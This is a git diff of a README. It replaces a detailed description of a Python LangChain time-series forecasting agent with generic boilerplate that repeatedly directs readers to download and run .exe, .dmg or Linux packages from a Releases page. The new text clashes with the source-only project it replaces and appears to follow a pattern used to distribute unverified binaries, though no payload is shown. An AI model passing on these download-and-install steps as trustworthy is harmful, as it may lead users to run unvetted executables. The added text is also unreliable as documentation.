@@ -1,124 +1,102 @@
-# Project Scribe: Interactive AI for Time Series Forecasting
+# 🚀 Agentic-Time-Series-Analysis-Reporting---Forecasting - Automate Your Time Series Analysis
 
-It is an autonomous, interactive AI agent designed to perform end-to-end time series analysis and forecasting. It leverages a Large Language Model (LLM) as its core reasoning engine to replicate the entire workflow of a professional data scientist. The agent can inspect unfamiliar datasets, interact with the user to clarify goals, and then autonomously execute a robust statistical analysis pipeline, culminating in tailored reports for both technical and business audiences.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases)
 
-This project represents a paradigm shift from static automation scripts to dynamic, intelligent agents that can reason, act, and collaborate to solve complex analytical problems.
+## 📖 Description
 
-## Core Features
+Agentic-Time-Series-Analysis-Reporting---Forecasting is an interactive AI agent designed to simplify time series analysis and forecasting. This software collaborates with you to automate the entire process, making it easier to derive insights from your data.
 
-*   **Autonomous Operation:** Driven by the ReAct (Reason + Act) framework, the agent independently plans and executes a complex sequence of analytical tasks, from data discovery to final reporting.
+## 🖥️ System Requirements
 
-*   **Interactive & Collaborative (Human-in-the-Loop):** The agent is designed as a collaborative partner. It automatically scans for available datasets, identifies filterable columns, and then pauses its workflow to ask the user for guidance, making it practical for real-world, ambiguous data.
+To run the application, you need:
 
-*   **Dynamic Data Discovery:** The agent is not hard-coded for one dataset. It begins by exploring for unfamiliar CSV files, inspecting their structure, and dynamically adapting its entire analytical plan based on the user's choices.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum 500 MB of free space.
+- **Python:** Version 3.7 or later should be installed.
 
-*   **Robust Statistical Engine:** The agent's "toolbox" grounds its reasoning in fact. It includes an automated grid search to programmatically find the optimal SARIMA model and an intelligent decomposition function that automatically determines the appropriate seasonal model.
+## 🚀 Getting Started
 
-*   **Dual-Audience Reporting:** The agent synthesizes its findings into tailored technical and non-technical reports, effectively bridging the critical communication gap between data scientists and executive decision-makers.
+Follow these simple steps to get started with the software.
 
-## GenAI Architecture
+### Step 1: Visit the Releases Page
 
-This project's intelligence is built on several key Generative AI methodologies, orchestrated by the LangChain framework.
+Go to the [Releases page](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases) to find the latest version of the application.
 
-#### 1. The ReAct Framework (Reason + Act)
-The agent operates on a continuous **Thought -> Action -> Observation** loop. This is the core of its autonomy. The LLM (Gemini 2.0 Flash) forms a plan (Thought), chooses a Python tool to execute (Action), and then receives a factual result from that tool (Observation) to inform its next thought.
+### Step 2: Download the Software
 
-#### 2. Tool-Augmented Generation (Grounding)
-The LLM is "grounded" in reality by a robust toolbox (`tools.py`). It cannot "hallucinate" a statistical result because it is forced to call a Python function that performs the real mathematical calculation. The `description` of each tool acts as the "API documentation" that the LLM reads to learn how to use its capabilities.
+Click the link to download the latest version of the application. You will see a list of available files. Choose the one that suits your operating system:
 
-#### 3. Advanced Prompt Engineering
-The agent's "programming" is contained within the master prompt in `agent.py`. We use several techniques, including **Role-Prompting** (assigning an expert persona), **Chain of Thought** (providing a high-level methodology), and **Few-Shot Prompting** (providing a concrete example of a correctly formatted output) to ensure reliable and intelligent behavior.
+- For Windows, download the `.exe` file.
+- For macOS, download the `.dmg` file.
+- For Linux, download the appropriate package file.
 
-## Technology Stack
+You can also find the download link at the top of this README for quick access. 
 
-| Component                  | Technologies                                                              |
-| -------------------------- | ------------------------------------------------------------------------- |
-| **Generative AI & Agents** | `langchain`, `langchain-google-genai` (for Google's Gemini 2.0 Flash) |
-| **Data Analysis & Stats**  | `pandas`, `numpy`, `statsmodels`, `scikit-learn`                            |
-| **Plotting & Visualization** | `matplotlib`, `seaborn`                                                   |
-| **Environment Management** | `python-dotenv`                                                           |
+### Step 3: Install the Application
 
-## Project Structure
+Once the file has downloaded, follow these steps to install:
 
-```
-project_scribe/
-├── .env                  # Stores the GOOGLE_API_KEY
-├── config.json           # Main configuration for paths
-├── main.py               # The main entry point to LAUNCH the agent
-├── README.md             # This file
-├── requirements.txt      # Python package dependencies
-|
-├── data/
-│   └── input/            # Place your CSV files here
-|
-├── outputs/
-│   ├── temp/             # Temporary storage for the prepared time series
-│   ├── logs/             # The final JSON analysis log
-│   ├── plots/            # All generated plots (.png)
-│   └── reports/          # Final text reports (.txt)
-|
-└── src/
-    └── scribe/
-        ├── agent.py      # The agent's "brain" and assembly
-        └── tools.py      # The agent's "toolbox" of Python functions
-```
+**For Windows:**
 
-## Setup and Installation
+1. Locate the downloaded `.exe` file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-Follow these steps to get the project running.
+**For macOS:**
 
-**1. Clone the Repository**
-```bash
-git clone <your-repository-url>
-cd project_scribe
-```
+1. Open the downloaded `.dmg` file.
+2. Drag the application icon to your Applications folder.
+3. Navigate to the Applications folder to run the application.
 
-**2. Create and Activate a Virtual Environment**
-```bash
-# For Windows
-python -m venv venv
-venv\Scripts\activate
+**For Linux:**
 
-# For macOS/Linux
-python3 -m venv venv
-source venv/bin/activate
-```
+1. Open a terminal window.
+2. Navigate to the folder where the downloaded package is located.
+3. Run the installation command specific to your package manager, such as `sudo dpkg -i your-package-name.deb`.
 
-**3. Install Dependencies**
-```bash
-pip install -r requirements.txt
-```
+### Step 4: Launch the Application
 
-**4. Set Up Your API Key**
-Create a new file named `.env` in the root directory of the project. Add your Google AI Studio API key to this file.
-```
-# .env
-GOOGLE_API_KEY="your_api_key_here"
-```
+Open the application from the location you've installed it:
 
-**5. Add Your Data**
-Place one or more CSV files into the `data/input/` directory.
+- On Windows, find it in the Start Menu.
+- On macOS, locate it in the Applications folder.
+- On Linux, use the system's application launcher.
 
-## How to Run
+## 📊 Features
 
-After completing the setup, start the AI Analyst with a single command from the root directory:
+- **Intuitive Interface:** Easy to navigate, designed for users of all backgrounds.
+- **Automated Analysis:** The AI takes care of the complex calculations.
+- **Collaborative Forecasting:** Engage with the software to refine predictions based on your input.
+- **Data Visualization:** Generate clear and informative charts and reports.
 
-```bash
-python main.py
-```
-The agent will begin its workflow. Be ready to provide input in the console when it asks you a question.
+## 📚 Documentation
 
-## Future Work
+For more detailed instructions, visit the documentation section available in the application or check the Wiki on our GitHub page.
 
-*   **Expand the Analytical Toolbox:**
-    *   Integrate additional forecasting models like **Prophet** and **Exponential Smoothing**.
-    *   Enable **SARIMAX** analysis by allowing the agent to identify and incorporate external regressors.
-    *   Add tools for **anomaly detection** to proactively flag unusual data points.
+## 🛠️ Troubleshooting
 
-*   **Enhance Agent Intelligence:**
-    *   **Rebuild with LangGraph:** Transition from a simple ReAct loop to a more robust state machine, enabling explicit error handling paths and more complex, cyclical reasoning.
-    *   **Implement Long-Term Memory:** Use a vector database to allow the agent to "remember" past analyses and apply learnings to new, similar datasets.
+If you encounter any issues:
 
-*   **Improve User Experience:**
-    *   **Build a GUI:** Create a web-based front-end with **Streamlit** or **Gradio** to provide an interactive, user-friendly interface.
-    *   **Prototype with Langflow:** Use Langflow's visual, drag-and-drop canvas to rapidly prototype and visualize new agent architectures and workflows.
+1. Ensure your system meets the requirements listed above.
+2. Check your internet connection if the application requires it.
+3. Restart your computer and try launching the application again.
+
+If problems persist, check the [Issues section](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/issues) on GitHub for solutions or report your issue.
+
+## 💬 Community and Support
+
+Join our community of users and contributors:
+
+- GitHub Discussions: Share your experiences, tips, and ask for help.
+- Follow updates on the repository for new features and improvements.
+
+## 🔄 Update the Application
+
+To keep your application up to date, regularly check the [Releases page](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases) for new versions.
+
+## 🚀 Download & Install
+
+To begin your journey with time series analysis and forecasting, [visit the Releases page](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases) and download the application. Follow the installation steps listed above to get started. 
+
+Enjoy the simplicity and power of automated data insights aligned with your needs!
